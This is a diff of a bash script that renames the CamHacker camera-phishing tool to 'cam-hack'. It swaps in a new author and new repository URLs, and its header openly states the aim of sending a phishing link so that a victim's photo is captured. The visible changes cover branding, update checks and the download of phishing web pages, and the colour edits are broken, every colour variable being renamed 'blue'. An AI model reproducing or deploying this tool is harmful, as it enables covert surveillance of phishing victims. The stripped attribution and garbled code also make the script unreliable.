@@ -1,15 +1,11 @@
 #!/bin/bash
 
-# CamHacker
+# cam-hack
 # Version    : 1.5
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
-# License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Description: cam-hack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : Karthik
+# Email      : maramkarthik21@gmail.com
+# Github     : https://github.com/karthik-reddy4444
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -41,23 +37,23 @@ SOFTWARE.
 
 # Colors
 
-black="\033[1;30m"
-red="\033[1;31m"
-green="\033[1;32m"
-yellow="\033[1;33m"
+blue="\033[1;30m"
+blue="\033[1;31m"
+blue="\033[1;32m"
+blue="\033[1;33m"
 blue="\033[1;34m"
-purple="\033[1;35m"
-cyan="\033[1;36m"
-violate="\033[1;37m"
-white="\033[0;37m"
-nc="\033[00m"
+blue="\033[1;35m"
+blue="\033[1;36m"
+blue="\033[1;37m"
+blue="\033[0;37m"
+blue="\033[00m"
 
 # Output snippets
-info="${cyan}[${white}+${cyan}] ${yellow}"
-info2="${blue}[${white}•${blue}] ${yellow}"
-ask="${green}[${white}?${green}] ${purple}"
-error="${yellow}[${white}!${yellow}] ${red}"
-success="${cyan}[${white}√${cyan}] ${green}"
+info="${cyan}[${white}+${blue}] ${blue}"
+info2="${blue}[${white}•${blue}] ${blue}"
+ask="${green}[${white}?${blue}] ${blue}"
+error="${yellow}[${white}!${blue}] ${blue}"
+success="${cyan}[${white}√${blue}] ${blue}"
 
 
 
@@ -68,21 +64,19 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}  ____                _   _            _
-${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
-${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
-${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
-${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
-${red}                                            [v${version}]
-${blue}                                    [By KasRoudra]
+${blue}  cam-hack ^_____^
+
+
+                                           [v${version}]
+${blue}                                    [By Karthik]
 "
 
 loclx_help="
 ${info}Steps: ${nc}
-${blue}[1]${yellow} Go to ${green}https://localxpose.io
+${blue}[1]${yellow} Go to ${white}https://localxpose.io
 ${blue}[2]${yellow} Create an account 
 ${blue}[3]${yellow} Login to your account
-${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
+${blue}[4]${yellow} Visit ${red}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
 "
 
 # Check for sudo
@@ -367,23 +361,23 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/karthik-reddy4444/cam-hack/main/files/version.txt`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/karthik-reddy4444/cam-hack/main/files/changelog.log)
     clear
     echo -e "$logo"
-    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
+    echo -e "${info}cam-hack has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update cam-hack?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}CamHacker updated successfully!!"
+            cd .. && rm -rf cam-hack cam-hack && git clone https://github.com/arthik-reddy4444/cam-hack
+            echo -e "\n${success}cam-hack updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
                 echo -e "$changelog" | head -n4
@@ -502,17 +496,16 @@ fi
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
+        echo -e "$red[ToolName]  ${cyan}  :[cam-hack]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/KasRoudra]
-$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
+$red[Author]     ${cyan} :[karthik]
+$red[Github]     ${cyan} :[https://github.com/karthik-reddy4444]
+$red[Email]      ${cyan} :[maramkarthik21@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/karthik-reddy4444/karthik#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -537,7 +530,7 @@ fi
 if ! [ -d sites ]; then
     mkdir sites
     netcheck
-    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/karthik-reddy4444/cam-hack/releases/latest/download/websites.zip"
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
